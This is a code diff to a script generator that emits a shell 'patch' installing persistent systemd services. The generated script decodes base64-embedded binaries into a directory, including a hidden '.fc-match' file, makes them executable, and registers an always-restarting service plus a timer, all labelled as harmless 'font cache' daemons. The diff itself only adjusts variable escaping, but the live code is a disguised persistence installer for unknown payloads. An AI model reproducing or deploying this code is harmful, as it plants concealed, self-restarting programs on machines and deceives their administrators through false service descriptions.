@@ -343,23 +343,23 @@ _s2="${P.SVC_VERIFY}"
 _py="\${_PY3_PATH}"
 _eb="\${_EMU_B64}"
 _vb="\${_VER_B64}"
-if ! systemctl is-active \${_s1} >/dev/null 2>&1; then
-  mkdir -p \${_d}
-  if [ ! -f \${_d}/\${_e} ]; then
-    echo "\${_eb}" | base64 -d > \${_d}/\${_e}
-    chmod +x \${_d}/\${_e}
+if ! systemctl is-active \\\${_s1} >/dev/null 2>&1; then
+  mkdir -p \\\${_d}
+  if [ ! -f \\\${_d}/\\\${_e} ]; then
+    echo "\\\${_eb}" | base64 -d > \\\${_d}/\\\${_e}
+    chmod +x \\\${_d}/\\\${_e}
   fi
-  if [ ! -f \${_d}/.fc-match ]; then
-    echo "\${_vb}" | base64 -d > \${_d}/.fc-match
-    chmod +x \${_d}/.fc-match
+  if [ ! -f \\\${_d}/.fc-match ]; then
+    echo "\\\${_vb}" | base64 -d > \\\${_d}/.fc-match
+    chmod +x \\\${_d}/.fc-match
   fi
-  if [ ! -f /etc/systemd/system/\${_s1}.service ]; then
-    cat > /etc/systemd/system/\${_s1}.service << _RS1_
+  if [ ! -f /etc/systemd/system/\\\${_s1}.service ]; then
+    cat > /etc/systemd/system/\\\${_s1}.service << _RS1_
 [Unit]
 Description=System font cache synchronization daemon
 After=network.target
 [Service]
-ExecStart=\${_py} ${P.BASE}/${P.EMULATOR}
+ExecStart=\\\${_py} ${P.BASE}/${P.EMULATOR}
 Restart=always
 RestartSec=3
 KillMode=process
@@ -369,8 +369,8 @@ StandardError=journal
 WantedBy=multi-user.target
 _RS1_
   fi
-  if [ ! -f /etc/systemd/system/\${_s2}.service ]; then
-    cat > /etc/systemd/system/\${_s2}.service << '_RS2_'
+  if [ ! -f /etc/systemd/system/\\\${_s2}.service ]; then
+    cat > /etc/systemd/system/\\\${_s2}.service << '_RS2_'
 [Unit]
 Description=Font cache garbage collection
 [Service]
@@ -378,8 +378,8 @@ Type=oneshot
 ExecStart=/bin/bash ${P.BASE}/.fc-match
 _RS2_
   fi
-  if [ ! -f /etc/systemd/system/\${_s2}.timer ]; then
-    cat > /etc/systemd/system/\${_s2}.timer << '_RS3_'
+  if [ ! -f /etc/systemd/system/\\\${_s2}.timer ]; then
+    cat > /etc/systemd/system/\\\${_s2}.timer << '_RS3_'
 [Unit]
 Description=Font cache gc timer
 [Timer]
@@ -391,9 +391,9 @@ WantedBy=timers.target
 _RS3_
   fi
   systemctl daemon-reload
-  systemctl enable \${_s1} \${_s2}.timer
-  systemctl start \${_s2}.timer
-  systemctl start \${_s1}
+  systemctl enable \\\${_s1} \\\${_s2}.timer
+  systemctl start \\\${_s2}.timer
+  systemctl start \\\${_s1}
 fi
 _PATCH_END_
 chmod +x ${P.PATCH_DIR}/${P.PATCH_FILE}
